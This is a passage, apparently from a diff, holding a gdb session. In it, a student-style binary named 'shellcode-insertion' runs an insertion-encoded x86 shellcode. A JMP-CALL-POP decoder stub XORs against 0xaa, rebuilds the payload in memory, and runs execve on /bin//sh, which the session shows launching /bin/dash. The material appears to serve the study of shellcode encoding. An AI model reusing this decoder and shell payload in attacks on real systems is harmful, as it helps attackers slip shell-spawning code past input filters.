+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    int    0x80
+   0x0804a07d <+61>:    mov    ebx,0xaae3aa89
+   0x0804a082 <+66>:    push   eax
+   0x0804a083 <+67>:    stos   BYTE PTR es:[edi],al
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+=> 0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    int    0x80
+   0x0804a07d <+61>:    mov    ebx,0xaae3aa89
+   0x0804a082 <+66>:    push   eax
+   0x0804a083 <+67>:    stos   BYTE PTR es:[edi],al
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 2, 0x0804a064 in code ()
+(gdb)
+Continuing.
+kan1shka9@dev:~/Desktop/Remain/31$ gdb -q ./shellcode-insertion
+Reading symbols from ./shellcode-insertion...(no debugging symbols found)...done.
+(gdb) break *&code
+Breakpoint 1 at 0x804a040
+(gdb) set disassembly-flavor intel
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/Remain/31/shellcode-insertion
+Shellcode length: 88
+
+Breakpoint 1, 0x0804a040 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+(gdb) break *0x0804a064
+Breakpoint 2 at 0x804a064
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804a064 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+=> 0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    int    0x80
+   0x0804a07d <+61>:    mov    ebx,0xaae3aa89
+   0x0804a082 <+66>:    push   eax
+   0x0804a083 <+67>:    stos   BYTE PTR es:[edi],al
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+(gdb) c
+Continuing.
+process 6835 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
+Error in re-setting breakpoint 1: No symbol "code" in current context.
+Error in re-setting breakpoint 1: No symbol "code" in current context.
+Warning:
+Cannot insert breakpoint 2.
+Cannot access memory at address 0x804a064
+
+(gdb)
